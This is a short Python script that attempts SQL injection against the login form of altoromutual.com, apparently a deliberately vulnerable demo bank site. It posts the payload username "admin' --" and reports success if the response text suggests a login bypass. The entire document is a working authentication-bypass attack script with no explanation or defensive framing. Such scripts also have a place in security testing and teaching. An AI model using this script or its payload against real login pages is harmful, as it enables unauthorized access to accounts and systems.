import requests
from requests.exceptions import ConnectionError, Timeout, TooManyRedirects

# The URL of the login page of the target application
url = "http://altoromutual.com/login"

# Headers for the POST request
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# The payload for SQL Injection attack
payload = {'username': "admin' --", 'password': "'"}

try:
    # Send the POST request to the target URL
    response = requests.post(url, data=payload, headers=headers)
    
    # Check if the response contains a success message indicating successful login
    if "Welcome" in response.text or "Logged in successfully" in response.text:
        print("Success! The application is vulnerable to SQL Injection.")
    else:
        print("Failed! No obvious sign of SQL Injection vulnerability detected.")
except ConnectionError:
    print("Connection Error - unable to connect to the server.")
except Timeout:
    print("Timeout - request timed out.")
except TooManyRedirects:
    print("Too many redirects.")